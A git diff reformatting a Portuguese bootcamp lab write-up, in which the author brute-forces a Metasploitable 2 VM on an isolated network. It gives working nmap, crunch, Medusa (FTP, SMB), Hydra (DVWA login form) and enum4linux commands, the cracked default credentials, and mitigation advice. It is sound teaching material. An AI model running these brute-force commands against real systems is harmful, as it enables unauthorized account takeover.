@@ -1,25 +1,29 @@
-# dio-santander-medusa-lab
-<h1>🔐 Projeto: Auditoria de Força Bruta com Medusa & Hydra</h1>
+# 🔐 Projeto: Auditoria de Força Bruta com Medusa & Hydra  
+**Autor:** Wevertton Bruno Bastos Felix  
+**Data:** 24/10/2025  
+**Bootcamp Santander 2025 | DIO — Cibersegurança e Pentest Ético**
 
-Bootcamp Santander 2025 | DIO — Cibersegurança e Pentest Ético
+---
 
-🧭 1. Preparação do Ambiente
+## 🧭 1. Preparação do Ambiente
 
-Data: ‎12‎/‎10‎/‎2025 — 20:51:21
-Snapshot: criado antes dos testes (scan rápido e completo)
-Alvo: 192.168.56.101 (Metasploitable 2)
-Atacante: Kali Linux
-Rede: Host-Only no VirtualBox
+**Data do teste:** ‎12‎/‎10‎/‎2025 — 20:51:21  
+**Snapshot:** criado antes dos testes (scan rápido e completo)  
+**Alvo:** `192.168.56.101` (Metasploitable 2)  
+**Atacante:** Kali Linux  
+**Rede:** Host-Only no VirtualBox  
 
-🔎 2. Reconhecimento Básico
+---
 
-Comando:
+## 🔎 2. Reconhecimento Básico
 
+**Comando:**
+```bash
 nmap -sC -sV -oN nmap_rapido.txt 192.168.56.101
+```
 
-
-Principais portas identificadas:
-
+**Principais portas identificadas:**
+```
 21/tcp    open  ftp         vsftpd 2.3.4
 22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
 23/tcp    open  telnet      Linux telnetd
@@ -31,160 +35,194 @@ Principais portas identificadas:
 3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
 5432/tcp  open  postgresql  PostgreSQL 8.3.x
 8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+```
 
-🔍 3. Reconhecimento Completo
+---
 
-Comando:
+## 🔍 3. Reconhecimento Completo
 
+**Comando:**
+```bash
 nmap -A -p- -oN nmap_completo.txt 192.168.56.101
+```
 
+**Destaques importantes:**
+- FTP anônimo habilitado (`Anonymous FTP login allowed`)  
+- SSH ativo (OpenSSH 4.7p1)  
+- Serviço SMB vulnerável (`Samba 3.0.20-Debian`)  
+- HTTP (DVWA e Tomcat 5.5) expostos  
+- MySQL, PostgreSQL e IRC abertos  
 
-Destaques importantes:
+🟢 **Vulnerabilidades acionáveis:**  
+- Login anônimo FTP → acesso direto sem credenciais  
+- Samba sem assinatura → suscetível a força bruta SMB  
+- DVWA exposta → alvo ideal para ataque de formulário web  
 
-FTP anônimo habilitado (Anonymous FTP login allowed)
+---
 
-SSH ativo (OpenSSH 4.7p1)
+## 🧾 4. Wordlists Criadas
 
-Serviço SMB vulnerável (Samba 3.0.20-Debian)
+**Arquivo:** `/home/kali/Desktop/wordlist/`
 
-HTTP (DVWA e Tomcat 5.5) expostos
+| Nome | Tamanho | Origem |
+|------|----------|---------|
+| **rockyou.txt** | 133.4 MB | `/usr/share/wordlists/rockyou.txt` |
+| **gmsfox6.txt** | 6.7 MB (1 M senhas) | Gerado com `crunch 6 6 0123456789` |
+| **user2.txt** | 4 KB | Criado manualmente (`user`, `msfadmin`, `admin`, `root`) |
+| **password2.txt** | 4 KB | Criado manualmente (`123456`, `password`, `qwerty`, `msfadmin`) |
 
-MySQL, PostgreSQL e IRC abertos
-
-🟢 Vulnerabilidades acionáveis:
-
-Login anônimo FTP → acesso direto sem credenciais
-
-Samba sem assinatura → suscetível a força bruta SMB
-
-DVWA exposta → alvo ideal para ataque de formulário web
-
-🧾 4. Wordlists Criadas
-
-Arquivo: /home/kali/Desktop/wordlist/
-
-Nome	Tamanho	Origem
-rockyou.txt	133.4 MB	/usr/share/wordlists/rockyou.txt
-gmsfox6.txt	6.7 MB (1 M senhas)	Gerado com crunch 6 6 0123456789
-user2.txt	4 KB	Criado manualmente (user, msfadmin, admin, root)
-password2.txt	4 KB	Criado manualmente (123456, password, qwerty, msfadmin)
-
-Comandos usados:
-
+**Comandos usados:**
+```bash
 cp /usr/share/wordlists/rockyou.txt /home/kali/Desktop/wordlist
 crunch 6 6 0123456789 -o gmsfox6.txt
 echo -e "user\nmsfadmin\nadmin\nroot" > user2.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > password2.txt
+```
 
-💥 5. Desafio A — Ataque de Força Bruta em FTP (Medusa)
+---
 
-Comando executado:
+## 💥 5. Desafio A — Ataque de Força Bruta em FTP (Medusa)
 
+**Comando executado:**
+```bash
 medusa -h 192.168.56.101 -U /home/kali/Desktop/wordlist/user2.txt -P /home/kali/Desktop/wordlist/password2.txt -M ftp | tee /home/kali/Desktop/wordlist/reports/ftp_results.txt
+```
 
-
-Resultado:
-
+**Resultado:**
+```
 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+```
 
-
-Validação manual:
-
+**Validação manual:**
+```bash
 ftp 192.168.56.101
 # Login: msfadmin
 # Password: msfadmin
 230 Login successful.
+```
 
+✅ **Acesso confirmado via FTP**.
 
-✅ Acesso confirmado via FTP.
+---
 
-🌐 6. Desafio B — Força Bruta em Formulário Web (DVWA)
+## 🌐 6. Desafio B — Força Bruta em Formulário Web (DVWA)
 
-Comando:
-
+**Comando:**
+```bash
 hydra -l admin -P /home/kali/Desktop/wordlist/password2.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=location"
+```
 
-
-Saída:
-
+**Saída:**
+```
 [80][http-post-form] host: 192.168.56.101   login: admin   password: qwerty
 [80][http-post-form] host: 192.168.56.101   login: admin   password: msfadmin
 [80][http-post-form] host: 192.168.56.101   login: admin   password: 123456
 [80][http-post-form] host: 192.168.56.101   login: admin   password: admin
 [80][http-post-form] host: 192.168.56.101   login: admin   password: password
+```
 
+**Acesso bem-sucedido:**  
+> URL: [http://192.168.56.101/dvwa/login.php](http://192.168.56.101/dvwa/login.php)  
+> **Usuário:** admin  
+> **Senha:** password  
 
-Acesso bem-sucedido:
+---
 
-URL: http://192.168.56.101/dvwa/login.php
+## 🧱 7. Desafio C — Enumeração e Password Spraying em SMB
 
-Usuário: admin
-Senha: password
-
-🧱 7. Desafio C — Enumeração e Password Spraying em SMB
-
-Enumeração:
-
+**Enumeração:**
+```bash
 enum4linux -a 192.168.56.101 | tee enum4linux.txt
+```
 
+**Resumo dos achados:**
+- Workgroup: `WORKGROUP`  
+- Servidor Samba: `3.0.20-Debian`  
+- Usuários detectados: `root`, `ftp`, `postgres`, `msfadmin`, `daemon`, `mysql`, `www-data`, etc.  
+- Shares acessíveis:  
+  - `tmp` → acesso permitido  
+  - `opt`, `print$`, `ADMIN$` → acesso negado  
 
-Resumo dos achados:
-
-Workgroup: WORKGROUP
-
-Servidor Samba: 3.0.20-Debian
-
-Usuários detectados: root, ftp, postgres, msfadmin, daemon, mysql, www-data, etc.
-
-Shares acessíveis:
-
-tmp → acesso permitido
-
-opt, print$, ADMIN$ → acesso negado
-
-Ataque SMB (Medusa):
-
+**Ataque SMB (Medusa):**
+```bash
 medusa -h 192.168.56.101 -U /home/kali/Desktop/wordlist/user2.txt -P /home/kali/Desktop/wordlist/password2.txt -M smbnt
+```
 
-
-Resultado:
-
+**Resultado:**
+```
 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+```
 
-
-Validação:
-
+**Validação:**
+```bash
 smbclient -L //192.168.56.101/ -U msfadmin
+```
 
-
-Shares acessíveis:
-
+**Shares acessíveis:**
+```
 print$     Disk
 tmp        Disk
 opt        Disk
 ADMIN$     IPC
 msfadmin   Disk (Home Directory)
+```
 
+✅ **Acesso SMB confirmado via msfadmin:msfadmin**
 
-✅ Acesso SMB confirmado via msfadmin:msfadmin
+---
 
-🛡️ 8. Recomendações de Mitigação
-Serviço	Risco	Medidas de Mitigação
-FTP	Acesso anônimo e senhas fracas	Desativar FTP, usar SFTP, implementar fail2ban, forçar políticas de senha forte
-DVWA / Web	Falta de proteção contra brute-force	Adicionar CAPTCHA, MFA, bloquear tentativas excessivas e armazenar senhas com hash
-SMB	Senhas fracas e SMBv1 habilitado	Atualizar para SMBv3, bloquear SMBv1, implementar bloqueio de tentativas e senhas fortes
-📚 9. Conclusão
+## 🛡️ 8. Recomendações de Mitigação
 
-Este laboratório simulou um cenário de ataque ético completo, explorando vulnerabilidades comuns de autenticação.
+| Serviço | Risco | Medidas de Mitigação |
+|----------|-------|----------------------|
+| **FTP** | Acesso anônimo e senhas fracas | Desativar FTP, usar SFTP, implementar fail2ban, forçar políticas de senha forte |
+| **DVWA / Web** | Falta de proteção contra brute-force | Adicionar CAPTCHA, MFA, bloquear tentativas excessivas e armazenar senhas com hash |
+| **SMB** | Senhas fracas e SMBv1 habilitado | Atualizar para SMBv3, bloquear SMBv1, implementar bloqueio de tentativas e senhas fortes |
+
+---
+
+## 📚 9. Conclusão
+
+Este laboratório simulou um cenário de ataque ético completo, explorando vulnerabilidades comuns de autenticação.  
 O aprendizado incluiu:
+- Uso prático de **Medusa** e **Hydra**  
+- Enumeração com **Nmap** e **Enum4linux**  
+- Identificação de **credenciais fracas e serviços vulneráveis**  
+- Documentação técnica e mitigação de riscos  
 
-Uso prático de Medusa e Hydra
+Todos os testes foram realizados em ambiente **controlado e isolado** (VirtualBox host-only).
 
-Enumeração com Nmap e Enum4linux
+---
 
-Identificação de credenciais fracas e serviços vulneráveis
+## 🧩 10. Estrutura Recomendada do Repositório
 
-Documentação técnica e mitigação de riscos
+```
+📂 / (repositório)
+├── README.md
+├── wordlists/
+│   ├── user2.txt
+│   ├── password2.txt
+│   ├── gmsfox6.txt
+│   └── README.txt
+├── reports/
+│   ├── nmap_rapido.txt
+│   ├── nmap_completo.txt
+│   ├── ftp_results.txt
+│   ├── dvwa_hydra_results.txt
+│   ├── enum4linux.txt
+│   └── smb_results.txt
+└── images/
+    ├── ftp_success.png
+    ├── dvwa_success.png
+    └── smb_success.png
+```
 
-Todos os testes foram realizados em ambiente controlado e isolado (VirtualBox host-only).
-Repositório com desafios, anotações e projetos desenvolvidos durante o bootcamp Santander 2025 na DIO.
+---
+
+## 🧾 11. Entrega do Desafio
+
+> Projeto prático de força bruta com Kali Linux, Metasploitable2, Medusa e Hydra.  
+> Foram realizados ataques simulados em FTP, DVWA e SMB, com documentação detalhada, wordlists próprias e recomendações de mitigação.  
+> Ambiente 100% isolado.  
+> **Bootcamp Santander 2025 — DIO.**  
+> Repositório: [cole o link do seu GitHub aqui]
